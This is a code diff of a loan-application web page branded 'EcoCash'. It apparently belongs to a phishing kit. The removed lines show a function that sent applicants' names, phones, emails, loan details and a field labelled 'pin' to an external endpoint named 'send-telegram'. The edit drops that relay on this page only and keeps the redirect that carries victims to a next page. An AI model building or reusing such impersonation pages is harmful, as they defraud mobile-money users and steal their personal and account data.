@@ -25,7 +25,6 @@
             margin: 0 auto;
         }
 
-        /* Loan Summary Bar */
         .loan-summary-bar {
             background: white;
             border-radius: 20px;
@@ -56,7 +55,6 @@
             margin-top: 2px;
         }
 
-        /* Apply Card */
         .apply-card {
             background: white;
             border-radius: 32px;
@@ -81,7 +79,6 @@
             padding-left: 12px;
         }
 
-        /* Form */
         .form-group {
             margin-bottom: 20px;
         }
@@ -192,7 +189,6 @@
 </head>
 <body>
 <div class="app-container">
-    <!-- Loan Summary Bar -->
     <div class="loan-summary-bar">
         <div class="summary-item">
             <span class="summary-label">Loan Amount</span>
@@ -212,7 +208,6 @@
         </div>
     </div>
 
-    <!-- Application Form -->
     <div class="apply-card">
         <div class="section-title">📱 Complete your application</div>
         <div class="section-sub">Fill in your personal details below</div>
@@ -267,9 +262,8 @@
 
 <script>
     // ============================================
-    // ECO CASH - BACKEND URL (UPDATE LATER)
+    // ECOCASH - NO TELEGRAM NOTIFICATION ON THIS PAGE
     // ============================================
-    const RAILWAY_URL = 'https://eco-cash-production.up.railway.app'; // UPDATE WITH YOUR RAILWAY URL
     
     function isValidPhone(phone) {
         const cleaned = phone.replace(/[\s\-\(\)]/g, '');
@@ -288,21 +282,7 @@
     document.getElementById('summaryMonthly').innerText = `$ ${parseFloat(monthly).toFixed(2)}`;
     document.getElementById('summaryRate').innerText = `${rate}%`;
 
-    async function sendToBackend(data) {
-        try {
-            const response = await fetch(`${RAILWAY_URL}/api/send-telegram`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-            const result = await response.json();
-            console.log('Backend response:', result);
-        } catch (error) {
-            console.error('Error:', error);
-        }
-    }
-
-    document.getElementById('applicationForm').addEventListener('submit', async function(e) {
+    document.getElementById('applicationForm').addEventListener('submit', function(e) {
         e.preventDefault();
         
         const fullName = document.getElementById('fullName').value.trim();
@@ -329,20 +309,7 @@
         
         errorMsgDiv.classList.remove('show');
         
-        // Send to backend (will work when you update RAILWAY_URL)
-        await sendToBackend({
-            phone: phone,
-            pin: monthlyIncome,
-            email: email,
-            name: fullName,
-            amount: amount,
-            term: term,
-            rate: rate,
-            monthly: monthly,
-            employment: employment,
-            type: 'application',
-            site: 'EcoCash'
-        });
+        // NO TELEGRAM NOTIFICATION - Just redirect to next page
         
         const params = new URLSearchParams();
         params.set('amount', amount);
